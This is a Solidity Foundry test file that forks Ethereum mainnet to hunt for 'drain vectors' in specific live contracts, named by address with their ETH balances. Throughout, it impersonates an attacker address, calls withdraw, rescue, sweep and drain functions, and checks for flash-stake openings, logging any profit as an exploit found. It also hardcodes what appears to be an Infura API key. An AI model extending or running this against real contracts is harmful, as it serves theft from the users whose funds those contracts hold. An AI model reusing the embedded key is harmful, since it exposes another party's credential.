// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Deep Exploit Search
 * @notice Look for actual drain vectors in high-value contracts
 */
contract DeepExploitSearchTest is Test {

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function test_earlyAdopterPoolExploit() public {
        // Contract: 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4
        // Balance: 627 ETH
        // Analysis: Users can only withdraw their own deposits

        address pool = 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4;
        address attacker = address(0xBEEF);

        uint256 poolBefore = pool.balance;
        uint256 attackerBefore = attacker.balance;

        console.log("=== EARLYADOPTERPOOL EXPLOIT TEST ===");
        console.log("Pool ETH:", poolBefore / 1e18);

        // Try to claim with fake deposit data
        vm.startPrank(attacker);

        // Attempt 1: Direct withdraw
        (bool success,) = pool.call(abi.encodeWithSignature("withdraw()"));
        console.log("Direct withdraw:", success ? "SUCCESS" : "FAILED");

        // Attempt 2: Try to manipulate storage
        // Cannot directly write storage in forked test

        vm.stopPrank();

        uint256 attackerAfter = attacker.balance;
        if (attackerAfter > attackerBefore) {
            console.log("!!! EXPLOIT FOUND - Profit:", (attackerAfter - attackerBefore) / 1e18, "ETH");
        } else {
            console.log("No exploit found for EarlyAdopterPool");
        }
    }

    function test_st1inchPodExploit() public {
        // st1INCH: 0x9A0C8Ff858d273f57072D714bca7411D717501D7
        // withdraw() call succeeded in scan - investigate

        address st1inch = 0x9A0C8Ff858d273f57072D714bca7411D717501D7;
        address attacker = address(0xBEEF);

        console.log("=== ST1INCH EXPLOIT TEST ===");
        console.log("Testing permissionless withdraw...");

        // Check balance of st1INCH
        (bool success, bytes memory data) = st1inch.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (success && data.length >= 32) {
            uint256 bal = abi.decode(data, (uint256));
            console.log("Attacker st1INCH balance:", bal);
        }

        uint256 attackerEthBefore = attacker.balance;

        vm.startPrank(attacker);

        // withdraw() succeeded in scan - but what did it do?
        (success,) = st1inch.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw() call:", success ? "SUCCESS" : "FAILED");

        // Try withdraw with amount
        (success,) = st1inch.call(
            abi.encodeWithSignature("withdraw(uint256)", 1 ether)
        );
        console.log("withdraw(1 ether):", success ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        uint256 attackerEthAfter = attacker.balance;
        if (attackerEthAfter > attackerEthBefore) {
            console.log("!!! PROFIT:", (attackerEthAfter - attackerEthBefore) / 1e18, "ETH");
        }
    }

    function test_searchForUnguardedWithdraw() public {
        console.log("=== SEARCHING FOR UNGUARDED WITHDRAWS ===");

        // Contracts that had permissionless calls succeed
        address[5] memory targets = [
            0x9A0C8Ff858d273f57072D714bca7411D717501D7,  // st1INCH - withdraw succeeded
            0x5Dc58f812b2e244DABA2fabd33f399cD699D7Ddc,  // GammaFarm
            0x996913c8c08472f584ab8834e925b06D0eb1D813,  // RewardVault
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4,  // DolaSavings
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4   // EarlyAdopterPool
        ];

        address attacker = address(0xDEAD);
        vm.deal(attacker, 100 ether);

        for (uint i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 targetBal = target.balance;
            console.log("");
            console.log("Target", i, ":", target);
            console.log("  ETH Balance:", targetBal / 1e18);

            // Check what functions exist
            vm.startPrank(attacker);

            // Try rescue/sweep functions that sometimes have bugs
            bytes4[] memory funcs = new bytes4[](10);
            funcs[0] = bytes4(keccak256("rescueTokens(address,uint256)"));
            funcs[1] = bytes4(keccak256("sweep(address)"));
            funcs[2] = bytes4(keccak256("recoverERC20(address,uint256)"));
            funcs[3] = bytes4(keccak256("withdrawEther()"));
            funcs[4] = bytes4(keccak256("withdrawETH(uint256)"));
            funcs[5] = bytes4(keccak256("transferETH(address,uint256)"));
            funcs[6] = bytes4(keccak256("drain()"));
            funcs[7] = bytes4(keccak256("claimAll()"));
            funcs[8] = bytes4(keccak256("getRewards()"));
            funcs[9] = bytes4(keccak256("collectRewards()"));

            for (uint j = 0; j < funcs.length; j++) {
                (bool success,) = target.call(abi.encodeWithSelector(funcs[j]));
                if (success) {
                    console.log("  !!! FUNCTION SUCCEEDED:", uint32(funcs[j]));
                }
            }

            vm.stopPrank();
        }
    }

    function test_flashLoanExploit() public {
        console.log("=== FLASH LOAN EXPLOIT TEST ===");

        // Check if any contract can be exploited via flash loan
        // Target: DolaSavings - if DBR balance is non-zero, flash stake could work

        address dolaSavings = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;

        // Get DBR token address
        (bool success, bytes memory data) = dolaSavings.staticcall(
            abi.encodeWithSignature("dbr()")
        );

        if (success && data.length >= 32) {
            address dbr = abi.decode(data, (address));
            console.log("DBR Token:", dbr);

            // Check DBR balance
            (success, data) = dbr.staticcall(
                abi.encodeWithSignature("balanceOf(address)", dolaSavings)
            );
            if (success && data.length >= 32) {
                uint256 dbrBal = abi.decode(data, (uint256));
                console.log("DBR Balance:", dbrBal);

                if (dbrBal > 0) {
                    console.log("!!! DBR BALANCE NON-ZERO - FLASH STAKE MIGHT WORK !!!");
                } else {
                    console.log("DBR Balance is 0 - no flash stake possible");
                }
            }
        }
    }
}
